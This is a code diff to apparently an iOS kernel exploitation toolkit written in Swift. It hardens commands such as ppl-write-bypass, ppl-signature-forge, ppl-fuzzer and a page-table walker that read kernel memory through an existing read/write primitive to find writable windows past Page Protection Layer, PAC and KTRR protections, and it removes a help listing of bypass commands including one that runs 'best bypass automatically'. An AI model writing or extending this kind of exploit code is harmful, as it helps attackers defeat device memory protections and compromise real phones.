@@ -461,6 +461,9 @@ OmegaCore.register("ppl-write-bypass") { rawArg, mgr in
         guard parts.count == 2, let va = _ghex(parts[0]) else {
             return .fail("ppl-write-bypass: usage — ppl-write-bypass <addr_hex> <u32_val_hex>")
         }
+        guard ds_isvalid(va) else {
+            return .fail(String(format: "ppl-write-bypass: address 0x%016llx invalid", va))
+        }
         let valStr = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
         guard let val = UInt32(valStr, radix: 16) else {
             return .fail("ppl-write-bypass: invalid value '\(parts[1])'")
@@ -484,6 +487,11 @@ OmegaCore.register("ppl-write-bypass") { rawArg, mgr in
 
         let va_mask: UInt64 = (1 << 39) - 1
         let pac_tag = raw_proc_ro & ~va_mask
+
+        let physmapBase = pm_get_physmap_base()
+        guard physmapBase != 0 else {
+            return .fail("ppl-signature-forge: physmap_base = 0 — run offsets → fixoffsets first")
+        }
 
         let rw_pcb = ds_get_rw_socket_pcb()
         guard rw_pcb != 0 else { return .fail("ppl-signature-forge: ds_get_rw_socket_pcb() = 0 — no scratch") }
@@ -660,6 +668,9 @@ OmegaCore.register("ppl-bypass-strategy-planner") { _, mgr in
         guard !parts.isEmpty, let start = _ghex(parts[0]) else {
             return .fail("ppl-fuzzer: usage — ppl-fuzzer <start_addr> [probe_len=128]")
         }
+        guard ds_isvalid(start) else {
+            return .fail(String(format: "ppl-fuzzer: start address 0x%016llx invalid", start))
+        }
         let len = Int(parts.count > 1 ? parts[1] : "") ?? 128
         var writable = [UInt64](repeating: 0, count: 32)
         var count: Int32 = 0
@@ -717,13 +728,19 @@ private func _regPPLHunter() {
         report.append("")
 
         let our_proc = ds_get_our_proc()
-        if our_proc != 0 && off_proc_p_proc_ro > 0 {
+        let physmapReady = pm_get_physmap_base() != 0
+        if our_proc != 0 && off_proc_p_proc_ro > 0 && physmapReady {
             let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
             let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
             if proc_ro != 0 {
                 report.append(_hunterPTEWalker(targetVA: proc_ro, label: "proc_ro"))
                 report.append("")
             }
+        } else if our_proc != 0 && off_proc_p_proc_ro > 0 && !physmapReady {
+            report.append("═══ Hunter 4: PTE Walker (proc_ro) ═══")
+            report.append("  physmap_base = 0 — cannot walk page tables")
+            report.append("  Fix: offsets → fixoffsets → auto-ppl-breaker")
+            report.append("")
         }
 
         if our_proc != 0 && off_proc_p_proc_ro > 0 && off_proc_ro_p_ucred > 0 {
@@ -732,16 +749,26 @@ private func _regPPLHunter() {
             if proc_ro != 0 {
                 let raw_ucred = ds_kread64(proc_ro + UInt64(off_proc_ro_p_ucred))
                 let ucred = raw_ucred & 0x0000000FFFFFFFFF
-                if ucred != 0 {
+                if ucred != 0 && physmapReady {
                     report.append(_hunterPTEWalker(targetVA: ucred, label: "ucred"))
+                    report.append("")
+                } else if ucred != 0 && !physmapReady {
+                    report.append("═══ Hunter 4: PTE Walker (ucred) ═══")
+                    report.append("  physmap_base = 0 — cannot walk page tables")
                     report.append("")
                 }
             }
         }
 
-        let kbase = ds_get_kernel_base()
-        if kbase != 0 {
-            report.append(_hunterPTEWalker(targetVA: kbase + 0x1000, label: "kernel_text+0x1000"))
+        if physmapReady {
+            let kbase = ds_get_kernel_base()
+            if kbase != 0 {
+                report.append(_hunterPTEWalker(targetVA: kbase + 0x1000, label: "kernel_text+0x1000"))
+                report.append("")
+            }
+        } else {
+            report.append("═══ Hunter 4: PTE Walker (kernel_text) ═══")
+            report.append("  physmap_base = 0 — cannot walk page tables")
             report.append("")
         }
 
@@ -957,6 +984,11 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
         return lines.joined(separator: "\n")
     }
 
+    guard ds_isvalid(targetVA) else {
+        lines.append(String(format: "  targetVA 0x%012llx invalid — abort", targetVA))
+        return lines.joined(separator: "\n")
+    }
+
     lines.append(String(format: "  TTBR1_EL1 (TTEP)  = 0x%016llx", ttep))
     lines.append(String(format: "  physmap_base      = 0x%016llx", physmapBase))
 
@@ -966,6 +998,10 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     let l3idx = (targetVA >> 12) & 0x1FF
 
     let l0eAddr = ttep + (l0idx * 8)
+    guard ds_isvalid(l0eAddr) else {
+        lines.append(String(format: "  L0 addr 0x%012llx invalid", l0eAddr))
+        return lines.joined(separator: "\n")
+    }
     let l0e = ds_kread64(l0eAddr)
     lines.append(String(format: "  L0[%3lld] @ 0x%012llx = 0x%016llx", l0idx, l0eAddr, l0e))
     guard (l0e & 1) != 0 else {
@@ -974,7 +1010,11 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     }
 
     let l1Phys = l0e & 0xFFFFFFFFF000
-    let l1VA = physmapBase + l1Phys - 0x800000000
+    let l1VA = physmapBase + l1Phys - UInt64(0x800000000)
+    guard ds_isvalid(l1VA) else {
+        lines.append(String(format: "  L1 VA 0x%012llx invalid (phys=0x%012llx)", l1VA, l1Phys))
+        return lines.joined(separator: "\n")
+    }
     let l1eAddr = l1VA + (l1idx * 8)
     let l1e = ds_kread64(l1eAddr)
     lines.append(String(format: "  L1[%3lld] @ 0x%012llx = 0x%016llx", l1idx, l1eAddr, l1e))
@@ -984,7 +1024,11 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     }
 
     let l2Phys = l1e & 0xFFFFFFFFF000
-    let l2VA = physmapBase + l2Phys - 0x800000000
+    let l2VA = physmapBase + l2Phys - UInt64(0x800000000)
+    guard ds_isvalid(l2VA) else {
+        lines.append(String(format: "  L2 VA 0x%012llx invalid (phys=0x%012llx)", l2VA, l2Phys))
+        return lines.joined(separator: "\n")
+    }
     let l2eAddr = l2VA + (l2idx * 8)
     let l2e = ds_kread64(l2eAddr)
     lines.append(String(format: "  L2[%3lld] @ 0x%012llx = 0x%016llx", l2idx, l2eAddr, l2e))
@@ -994,7 +1038,11 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     }
 
     let l3Phys = l2e & 0xFFFFFFFFF000
-    let l3VA = physmapBase + l3Phys - 0x800000000
+    let l3VA = physmapBase + l3Phys - UInt64(0x800000000)
+    guard ds_isvalid(l3VA) else {
+        lines.append(String(format: "  L3 VA 0x%012llx invalid (phys=0x%012llx)", l3VA, l3Phys))
+        return lines.joined(separator: "\n")
+    }
     let l3eAddr = l3VA + (l3idx * 8)
     let l3e = ds_kread64(l3eAddr)
     lines.append(String(format: "  L3[%3lld] @ 0x%012llx = 0x%016llx", l3idx, l3eAddr, l3e))
@@ -1027,72 +1075,9 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
         apBits, apDesc, pxn, uxn, af, sh, attrIndx, ns, ng))
 
     let pagePhys = l3e & 0xFFFFFFFFF000
-    let pageVA = physmapBase + pagePhys - 0x800000000
-    lines.append(String(format: "  Page physical = 0x%012llx  physmap VA = 0x%012llx", pagePhys, pageVA))
-
-    let pplHeuristic = (attrIndx == 4 || attrIndx == 5) && apBits == 2
-    if pplHeuristic {
-        lines.append("  [WARN] PPL HEURISTIC TRIGGERED: ATTR=4/5 + RO — possible PPL page")
-    }
-
-    if apBits == 0 && pxn == 0 {
-        lines.append("  [OK] PAGE IS RW+EXECUTABLE — full access (unlikely for PPL)")
-    } else if apBits == 0 {
-        lines.append("  [OK] PAGE IS RW — writable (bypass possible if no PPL bit)")
-    } else if apBits == 2 {
-        lines.append("  [FAIL] PAGE IS READ-ONLY — write will fault or be blocked")
-    }
+    let pageVA = physmapBase + pagePhys - UInt64(0x800000000)
+    lines.append(String(format: "  page_phys = 0x%012llx  page_va = 0x%012llx", pagePhys, pageVA))
 
     return lines.joined(separator: "\n")
 }
 
-private func _regHelpPPL() {
-    OmegaCore.register("help-ppl") { _, _ in
-        .ok("""
-help-ppl: PAC / KTRR / SMR / PPL Analysis (OmegaExtendedG)
-─────────────────────────────────────────────────────────────────────────
-  PAC — Pointer Authentication:
-    pac-reader <va>                 Decode PAC-signed kernel pointer
-    pac-signature-extractor <ptr>   Extract PAC tag from raw pointer
-    pac-key-scanner [start] [end]   Scan kernel for PAC-signed ptrs
-    pac-context-analyzer <ptr>      PACDA vs PACIA analysis
-    pac-entropy-checker <va> [n]    Measure PAC signature entropy
-    pac-algorithm-fingerprint       Identify PAC algorithm (QARMA)
-    pac-strength-analyzer           Overall PAC protection score
-    pac-coverage-mapper             PAC coverage of known structs
-    pac-weak-key-detector <va> [n] [t]  Check for duplicate tags
-    pac-null-pointer-checker <va>   Find null-PAC (PACIZA) ptrs
-    pac-bypass-validator            Confirm bypass correctness
-
-  KTRR — Kernel Text Region Read-only:
-    ktrr-region-mapper              All KTRR-protected regions + PTE
-    ktrr-boundary-finder            Exact KTRR start/end VA
-    ktrr-permission-checker <addr>  AP bits + protection for addr
-    ktrr-enforcement-detector       Is KTRR hardware-enforced?
-    ktrr-bypass-paths-finder        RW windows via physmap
-
-  SMR — Secure Memory Region:
-    smr-region-scanner              Scan allproc for SMR ptrs
-    smr-metadata-reader <ptr>       Decode SMR pointer + epoch
-    smr-protection-level-analyzer   Epoch size + rotation policy
-    smr-isolation-tester <ptr>      SMR boundary reachability
-
-  PPL — Page Protection Layer:
-    ppl-status                      Full PPL + privilege snapshot
-    ppl-phase-report                OmegaPhysmap P1/P2/P3 results
-    ppl-write-bypass <addr> <val>   physmap write attempt
-    ppl-signature-forge             EXTRACT PAC tag + build fake proc_ro (read-only)
-    ppl-protected-variable-read <a> Read + PPL zone check
-    ppl-bypass-strategy-planner     Auto-recommend bypass path
-    ppl-fuzzer <addr> [len]         Probe for writable windows
-    ppl-version-comparison          PPL history across iOS versions
-    auto-ppl-breaker                Run best bypass automatically
-    comprehensive-ppl-tester        Full 7-check test battery
-
-  PPL HUNTER — Multi-Vector Autonomous Scanner:
-    ppl-hunter                      Run all 6 hunters (Zone, Fork, PAC, PTE×3)
-                                    Reports exploitable targets + PTE layout
-─────────────────────────────────────────────────────────────────────────
-""")
-    }
-}
